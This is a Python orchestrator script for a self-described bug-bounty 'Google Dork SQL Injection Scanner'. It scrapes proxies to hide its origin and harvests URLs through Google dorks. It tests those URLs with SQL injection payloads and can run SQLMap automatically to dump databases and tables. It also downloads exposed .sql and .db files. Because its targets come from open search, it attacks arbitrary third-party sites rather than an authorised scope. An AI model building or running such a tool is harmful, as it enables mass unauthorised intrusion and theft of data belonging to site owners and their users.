#!/usr/bin/env python3
"""
Google Dork SQL Injection Scanner
Main orchestrator script
"""

import os
import sys
import argparse
from colorama import init, Fore, Style
from proxy_scraper import ProxyScraper
from proxy_validator import ProxyValidator
from google_searcher import GoogleSearcher
from sql_checker import SQLChecker
from database_downloader import DatabaseDownloader
from data_organizer import DataOrganizer
from sqlmap_integration import SQLMapIntegration
from banner import print_banner, print_section_header, print_status, print_stats, print_vulnerability_found, print_sqlmap_success, print_footer, print_progress_bar

init(autoreset=True)

def load_dorks(dorks_file: str) -> list:
    """Load Google dorks from file"""
    if not os.path.exists(dorks_file):
        print(f"{Fore.RED}[!] Dorks file not found: {dorks_file}")
        print(f"{Fore.YELLOW}[*] Creating sample dorks.txt file...")
        create_sample_dorks(dorks_file)
        return []
    
    with open(dorks_file, 'r', encoding='utf-8') as f:
        dorks = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    return dorks

def create_sample_dorks(filename: str):
    """Create a sample dorks file"""
    sample_dorks = [
        "inurl:index.php?id=",
        "inurl:page.php?id=",
        "inurl:product.php?id=",
        "inurl:category.php?id=",
        "inurl:view.php?id=",
        "inurl:item.php?id=",
        "filetype:sql",
        "filetype:db",
        "filetype:sqlite",
        "intitle:index.of database",
        "inurl:database.sql",
        "inurl:backup.sql",
        "inurl:dump.sql",
    ]
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("# Google Dorks for SQL Injection and Database Discovery\n")
        f.write("# Add your dorks here, one per line\n\n")
        for dork in sample_dorks:
            f.write(f"{dork}\n")
    
    print(f"{Fore.GREEN}[+] Created sample dorks file: {filename}")

def main():
    parser = argparse.ArgumentParser(
        description='Google Dork SQL Injection Scanner for Bug Bounties',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py --dorks dorks.txt
  python main.py --dorks dorks.txt --max-proxies 50
  python main.py --dorks dorks.txt --no-proxy
        """
    )
    
    parser.add_argument('--dorks', '-d', default='dorks.txt',
                       help='Path to dorks file (default: dorks.txt)')
    parser.add_argument('--max-proxies', '-p', type=int, default=20,
                       help='Maximum number of proxies to use (default: 20)')
    parser.add_argument('--no-proxy', action='store_true',
                       help='Run without proxies (not recommended)')
    parser.add_argument('--output', '-o', default='results.txt',
                       help='Output file for results (default: results.txt)')
    parser.add_argument('--skip-validation', action='store_true',
                       help='Skip proxy validation (faster but less reliable)')
    parser.add_argument('--aggressive', '-a', action='store_true',
                       help='Use aggressive SQL injection testing with all payloads')
    parser.add_argument('--use-sqlmap', '-s', action='store_true',
                       help='Automatically use SQLMap on vulnerable URLs (requires SQLMap)')
    parser.add_argument('--sqlmap-path', default=None,
                       help='Path to SQLMap (auto-detected if not specified)')
    parser.add_argument('--max-urls', type=int, default=None,
                       help='Maximum number of URLs to test (default: unlimited)')
    
    args = parser.parse_args()
    
    # Print banner
    print_banner()
    
    # Load dorks
    print_section_header("🔍 LOADING GOOGLE DORKS")
    print_status(f"Loading dorks from: {args.dorks}", "info")
    dorks = load_dorks(args.dorks)
    
    if not dorks:
        print_status(f"No dorks loaded. Please add dorks to {args.dorks}", "error")
        return
    
    print_status(f"Loaded {len(dorks)} dorks successfully", "success")
    
    # Scrape and validate proxies
    proxy = None
    if not args.no_proxy:
        print_section_header("🔄 PROXY MANAGEMENT")
        print_status("Scraping proxies from multiple sources...", "info")
        scraper = ProxyScraper()
        proxies = scraper.scrape_all()
        
        if proxies:
            if args.skip_validation:
                print_status("Skipping proxy validation (faster mode)", "warning")
                valid_proxies = proxies[:args.max_proxies]
            else:
                print_status(f"Validating {min(len(proxies), args.max_proxies*2)} proxies...", "info")
                validator = ProxyValidator()
                valid_proxies = validator.validate_proxies(proxies[:args.max_proxies*2])
                valid_proxies = valid_proxies[:args.max_proxies]
            
            if valid_proxies:
                proxy = valid_proxies[0]
                print_status(f"Using proxy: {proxy['ip']}:{proxy['port']}", "success")
            else:
                print_status("No valid proxies found. Continuing without proxy...", "warning")
        else:
            print_status("No proxies found. Continuing without proxy...", "warning")
    
    # Search Google with dorks
    print_section_header("🔎 GOOGLE SEARCH AUTOMATION")
    print_status(f"Searching Google with {len(dorks)} dork queries...", "info")
    searcher = GoogleSearcher(proxy)
    search_results = searcher.search_multiple_dorks(dorks, proxy)
    
    if not search_results:
        print_status("No search results found", "error")
        return
    
    print_status(f"Found {len(search_results)} total search results", "success")
    
    # Extract URLs
    urls = [result['url'] for result in search_results]
    unique_urls = list(set(urls))
    print_status(f"Found {len(unique_urls)} unique URLs", "success")
    
    # Limit URLs if specified
    if args.max_urls:
        unique_urls = unique_urls[:args.max_urls]
        print_status(f"Limited to {len(unique_urls)} URLs for testing", "info")
    
    # Check for SQL injection vulnerabilities
    print_section_header("💉 SQL INJECTION VULNERABILITY DETECTION")
    if args.aggressive:
        print_status("🔥 AGGRESSIVE MODE: Using comprehensive payload library (100+ payloads)", "vuln")
    else:
        print_status("Using standard payload testing", "info")
    
    checker = SQLChecker(proxy, aggressive=args.aggressive)
    vulnerable_urls = checker.check_urls(unique_urls, proxy)
    
    if vulnerable_urls:
        print_status(f"Found {len(vulnerable_urls)} potentially vulnerable URLs", "vuln")
        
        # Show vulnerabilities
        for vuln in vulnerable_urls[:5]:  # Show first 5
            print_vulnerability_found(
                vuln.get('url', 'N/A'),
                vuln.get('vulnerable_param', 'N/A'),
                vuln.get('payload', 'N/A')
            )
        if len(vulnerable_urls) > 5:
            print_status(f"... and {len(vulnerable_urls) - 5} more vulnerabilities", "info")
        
        # Automatically exploit with SQLMap if requested
        if args.use_sqlmap:
            print_section_header("🔥 SQLMAP AUTOMATED EXPLOITATION")
            print_status("Starting SQLMap exploitation on vulnerable URLs...", "exploit")
            sqlmap = SQLMapIntegration(sqlmap_path=args.sqlmap_path)
            
            if sqlmap.check_sqlmap_installed():
                proxy_url = None
                if proxy:
                    proxy_url = f"{proxy['protocol']}://{proxy['ip']}:{proxy['port']}"
                
                sqlmap_results = sqlmap.exploit_vulnerable_urls(
                    vulnerable_urls,
                    use_proxy=proxy is not None,
                    proxy=proxy_url
                )
                
                # Add SQLMap results to vulnerable URLs
                for i, vuln in enumerate(vulnerable_urls):
                    if i < len(sqlmap_results):
                        vuln['sqlmap_result'] = sqlmap_results[i]
                        if sqlmap_results[i].get('success'):
                            print_sqlmap_success(
                                vuln['url'],
                                sqlmap_results[i].get('databases', []),
                                sqlmap_results[i].get('tables', [])
                            )
            else:
                print_status("SQLMap not found. Install with: sudo apt install sqlmap", "error")
                print_status("Continuing without SQLMap exploitation...", "warning")
    else:
        print_status("No SQL injection vulnerabilities detected", "info")
    
    # Download and parse database files
    print_section_header("💾 DATABASE FILE EXTRACTION")
    print_status("Checking for database files in search results...", "info")
    downloader = DatabaseDownloader(proxy)
    urls_to_check = unique_urls if not args.max_urls else unique_urls[:args.max_urls]
    database_data = downloader.extract_data_from_urls(urls_to_check, proxy)
    
    if database_data:
        print_status(f"Extracted data from {len(database_data)} database items", "success")
    else:
        print_status("No database files found", "info")
    
    # Organize and save results
    print_section_header("📊 ORGANIZING RESULTS")
    organizer = DataOrganizer(args.output)
    organizer.organize_vulnerable_urls(vulnerable_urls)
    organizer.organize_database_files(downloader.downloaded_files)
    organizer.write_to_file()
    organizer.write_json(args.output.replace('.txt', '.json'))
    
    # Print statistics
    stats = {
        "Total Dorks": len(dorks),
        "Search Results": len(search_results),
        "Unique URLs": len(unique_urls),
        "Vulnerable URLs": len(vulnerable_urls),
        "Database Files": len(downloader.downloaded_files),
        "SQLMap Exploited": len([v for v in vulnerable_urls if v.get('sqlmap_result', {}).get('success', False)])
    }
    print_stats(stats)
    
    # Print footer
    print_footer(args.output)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}\n⚠️  Scan interrupted by user{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Partial results may be available in output files.{Style.RESET_ALL}\n")
        sys.exit(0)
    except ImportError as e:
        print(f"\n{Fore.RED}❌ Import Error: {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Please install dependencies: pip install -r requirements.txt{Style.RESET_ALL}\n")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Fore.RED}❌ Error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
